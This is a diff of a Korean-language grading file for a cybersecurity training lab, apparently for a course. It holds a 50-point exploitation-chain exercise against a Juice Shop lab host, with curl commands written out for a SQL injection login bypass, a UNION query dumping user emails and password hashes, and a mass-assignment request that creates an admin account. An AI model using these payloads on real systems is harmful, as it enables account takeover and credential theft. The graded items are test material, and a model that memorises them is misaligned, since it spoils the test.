-      - DefectDojo OWASP 매핑
-      - PTES Report 템플릿
+      - "echo > 보고서 (수기 baseline): OWASP A01/A03/A04/A05 매핑."
+      - "heredoc cat > EOF: 표준."
+      - "Markdown + pandoc → PDF: eisvogel."
+      - "DefectDojo Engagement: OWASP 자동."
+      - "Faraday IDE: collaborative."
+      - "Dradis framework."
+      - "python3 + jinja2: 자동 generation."
+      - "SARIF: CI/CD GitHub."
+      - "MITRE ATT&CK 매핑 (T1190/T1078/T1068/T1136/T1213)."
       negative_signs:
       - OWASP 카테고리 매핑 없음
       - 공격 종류 분류 없음
@@ -531,27 +837,27 @@ steps:
   instruction: |
     [복합 시나리오] "Exploitation chain — SQLi 인증 우회 + UNION DB + Mass Assignment 권한 상승"
 
-    ## 상황 (w03 → w04 시나리오 연속)
+    ■ 상황 (w03 → w04 시나리오 연속)
 
-    > 선임: "정찰 끝났으면 익스플로잇. 한 취약점만 쓰면 의미 없어 — *chain* 이 진짜야.
-    > SQLi → UNION → Mass Assignment. ATT&CK 매핑까지."
+    ※ 선임: "정찰 끝났으면 익스플로잇. 한 취약점만 쓰면 의미 없어 — *chain* 이 진짜야.
+    ※ SQLi → UNION → Mass Assignment. ATT&CK 매핑까지."
 
     학습 목표 (lecture #2·#3·#4 SQLi + sqlmap) + (lab #1·#5·#4 SQLi auth/UNION/Mass) 통합.
 
-    ## 임무 (3 단계, 약 35분)
+    ■ 임무 (3 단계, 약 35분)
 
     Non-AI 트랙: ssh ccc@10.20.30.201 (attacker VM) 직접 실행.
 
-    ### Phase A — SQLi 인증 우회 + JWT
+    ▶ Phase A — SQLi 인증 우회 + JWT
     `curl -s -X POST -H "Content-Type: application/json" -d "{\"email\":\"admin@juice-sh.op' OR 1=1--\",\"password\":\"x\"}" http://10.20.30.80:3000/rest/user/login | head -c 500`
     `JWT=$(curl -s -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}' http://10.20.30.80:3000/rest/user/login | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('authentication',{}).get('token',''))" 2>/dev/null)`
     `echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null`
 
-    ### Phase B — UNION + Mass Assignment
+    ▶ Phase B — UNION + Mass Assignment
     `curl -s "http://10.20.30.80:3000/rest/products/search?q=qwert%27))%20UNION%20SELECT%20id,email,password,role,createdAt,updatedAt,deletedAt%20FROM%20Users--" | head -c 500`
     `curl -s -i -X POST -H "Content-Type: application/json" -d '{"email":"chain'$(date +%s)'@x.com","password":"Test1234!","role":"admin","isAdmin":true}' http://10.20.30.80:3000/api/Users/ | head -20`
 
-    ### Phase C — ATT&CK 매트릭스
+    ▶ Phase C — ATT&CK 매트릭스
     | ATT&CK | 단계 | 페이로드 | 결과 |
     | T1190 Exploit Public-Facing | Initial Access | ' OR 1=1-- | admin JWT/차단 |
     | T1078 Valid Accounts | Initial Access | UNION → email/hash | 자격증명 |
@@ -566,6 +872,14 @@ steps:
     Phase B: UNION 7 컬럼. Mass 차단 정상.
     Phase C: 5행 ATT&CK + w05 입력.
     포인트: chain 관점 권한 상승.
+
+    📎 도구 우선순위 (힌트):
+    1) Phase A: curl POST + ' OR 1=1-- (SQLi auth) → JWT base64 decode.
+    2) Phase B: curl + UNION SELECT 7 컬럼 + curl POST + role:admin (Mass).
+    3) Phase C: markdown 5행 + ATT&CK ID (T1190/T1078/T1068/T1136/T1213).
+    4) 미설치 시: sudo apt install -y curl python3 jq
+    5) 추가: sqlmap --batch (자동 SQLi), jwt_tool.py (JWT 변조), Arjun (Mass field 발견).
+    6) chain 의 핵심: 한 단계 결과 → 다음 단계 입력 (auth → JWT → DB → admin 등록).
   category: integration_scenario
   points: 50
   verify:
@@ -581,10 +895,15 @@ steps:
       - Phase B — UNION + Mass POST
       - Phase C — 5행 ATT&CK + w05 입력
       acceptable_methods:
-      - curl + python3 base64
-      - UNION 7 컬럼
-      - role:admin JSON
-      - markdown table T-id
+      - "Phase A SQLi + JWT (수기 baseline): curl POST + ' OR 1=1-- → JWT base64 decode."
+      - "Phase B UNION + Mass: curl UNION SELECT 7 컬럼 + role:admin POST."
+      - "Phase C 매트릭스: 5행 ATT&CK ID."
+      - "sqlmap --batch: 자동 SQLi."
+      - "jwt_tool.py: JWT 변조."
+      - "Arjun: Mass field 발견."
+      - "PayloadAllTheThings: chain 페이로드."
+      - "MITRE ATT&CK Navigator: 시각."
+      - "Bastion AI exploit chain: 자동 chain orchestrator + KG anchor."
       negative_signs:
       - SQLi 1 케이스만
       - JWT 누락
